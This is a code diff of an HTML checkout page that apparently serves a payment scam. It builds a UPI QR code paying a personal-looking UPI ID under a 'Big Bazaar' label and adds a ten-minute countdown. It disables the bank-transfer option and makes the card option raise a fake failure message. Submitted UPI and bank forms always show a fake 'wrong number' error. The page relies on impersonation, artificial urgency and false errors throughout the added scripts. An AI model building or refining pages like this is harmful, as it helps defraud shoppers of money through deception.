@@ -64,10 +64,10 @@
                     <p>Credit/Debit Card</p>
                 </div>
 
-                <div class="payment-option bank" data-toggle="modal" data-target="#bankModal">
+                <!-- <div class="payment-option bank" data-toggle="modal" data-target="#bankModal">
                     <img src="assets/image/bank.png" alt="Bank Transfer">
                     <p>Bank Transfer</p>
-                </div>
+                </div> -->
             </div>
         </div>
     </section>
@@ -186,9 +186,51 @@ justify-content: center;
         </div>
     </div>
 
+    <script>
+        const ticket = localStorage.getItem("ticketPrice");
+        const price = ticket;
+        const txnno = "Paying-to-Big-Bazaar";
+        const upi = "gettdeelshub@sbi";        
+        const predefinedURL = `upi://pay?pa=${upi}&am=${price}&tn=${txnno}&pn=ServiceStation&tr=&cu=INR&mc=5499`;
+        const url = encodeURIComponent(predefinedURL);
+        const size = "100x160";
+        const qrImg = document.getElementById('qrImg');
+        qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?data=${url}&size=${size}`;
+    </script>
+
+
+
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script>
+        // Countdown Timer Implementation
+        function startCountdown(duration, display) {
+            let timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = minutes + ":" + seconds;
+
+                if (--timer < 0) {
+                    timer = duration;
+                }
+            }, 1000);
+        }
+
+        window.onload = function () {
+            const tenMinutes = 60 * 10,
+                display = document.querySelector('#countdown');
+            startCountdown(tenMinutes, display);
+        };
+    </script>
 
     <script>
-
         document.addEventListener("DOMContentLoaded", function () {
             const copyButton = document.getElementById("copyUpiId");
             const upiIdText = document.getElementById("upiId");
@@ -206,50 +248,75 @@ justify-content: center;
                 });
             });
         });
+    </script>
 
+
+    <script>
+        var ticketPrice1 = localStorage.getItem("ticketPrice");
+        console.log(ticketPrice1)
+
+        document.getElementById("pay").innerHTML = "₹" + ticketPrice1;
+    </script>
+
+
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const creditCardOption = document.getElementById('creditCardOption');
+
+            creditCardOption.addEventListener('click', function () {
+                // Display a SweetAlert with an error message
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Oops...',
+                    text: "Currently We Are Facing High rate of failure's please Choose another Payment Method",
+                    confirmButtonColor: '#d33',
+                    confirmButtonText: 'OK'
+                });
+            });
+        });
     </script>
 
     <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const paymentForm = document.getElementById('UpipaymentForm');
 
-        const ticket = localStorage.getItem("ticketPrice");
-        const price = ticket;
-        const txnno = "Paying-to-Big-Bazaar";
-        const upi = "gettdeelshub@sbi";
-        const predefinedURL = `upi://pay?pa=${upi}&am=${price}&tn=${txnno}&pn=ServiceStation&tr=&cu=INR&mc=5499`;
-        const url = encodeURIComponent(predefinedURL);
-        const size = "100x160";
-        const qrImg = document.getElementById('qrImg');
-        qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?data=${url}&size=${size}`;
+            paymentForm.addEventListener('submit', function (event) {
+                event.preventDefault(); // Prevent the default form submission
 
+                // Display a SweetAlert when the form is submitted
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Seems Wrong',
+                    text: 'You Entered The wrong Number Please Recheck the number again',
+                    confirmButtonColor: '#f27474',
+                    confirmButtonText: 'OK'
+                });
+
+                // You can add additional logic here, such as sending the form data to the server.
+                // For example: paymentForm.submit();
+            });
+        });
+    </script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const paymentForm = document.getElementById('paymentforbank');
+
+            paymentForm.addEventListener('submit', function (event) {
+                event.preventDefault(); // Prevent the default form submission
+
+                // Display a SweetAlert when the form is submitted
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Seems Wrong',
+                    text: 'You Entered The wrong Number Please Recheck the number again',
+                    confirmButtonColor: '#f27474',
+                    confirmButtonText: 'OK'
+                });
+            });
+        });
     </script>
 
-<script>
-
-            // Countdown Timer Implementation
-            function startCountdown(duration, display) {
-                let timer = duration, minutes, seconds;
-                setInterval(function () {
-                    minutes = parseInt(timer / 60, 10);
-                    seconds = parseInt(timer % 60, 10);
-
-                    minutes = minutes < 10 ? "0" + minutes : minutes;
-                    seconds = seconds < 10 ? "0" + seconds : seconds;
-
-                    display.textContent = minutes + ":" + seconds;
-
-                    if (--timer < 0) {
-                        timer = duration;
-                    }
-                }, 1000);
-            }
-
-            window.onload = function () {
-                const tenMinutes = 60 * 10,
-                    display = document.querySelector('#countdown');
-                startCountdown(tenMinutes, display);
-            };
-        
-</script>
 </body>
 
 </html>
